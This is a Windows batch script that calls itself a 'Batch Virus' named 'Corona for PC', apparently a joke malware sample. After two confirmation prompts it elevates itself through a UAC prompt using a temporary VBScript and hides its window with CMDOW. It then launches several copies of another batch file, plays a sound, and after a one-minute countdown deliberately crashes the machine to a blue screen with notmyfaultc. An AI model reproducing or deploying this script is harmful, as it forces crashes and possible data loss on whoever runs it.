@echo off
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    CMDOW @ /HID
    pause

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
echo You sure you want to run this?
choice
IF %errorlevel%==1 goto start
IF %errorlevel%==2 goto exit
:: Batch Virus
:: Name is Corona for PC
:: main
:start
echo Are you REALLY sure? (this will BSOD your PC)
choice
IF %errorlevel%==1 goto continue
IF %errorlevel%==2 goto exit
:continue
echo Don't even think about closing this window...
goto hide
:bsod
notmyfaultc crash 1
:hide
CMDOW @ /HID
goto music
:music
:: Give the user a time to read
start "important message" cmd /c "echo You have a minute until your PC bsods. Use it the best you can! & pause"
timeout /t 5 /nobreak
start "sus shell :)" powershell -command "(New-Object Media.SoundPlayer "%CD%\errorsong.wav").PlaySync();"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
start "sussy shell :)" cmd /c "%CD%\sussy.bat"
timeout /t 60
goto bsod
pause
:exit
echo Understandable. Have a great day.
timeout /t 2 /nobreak
exit /b %random%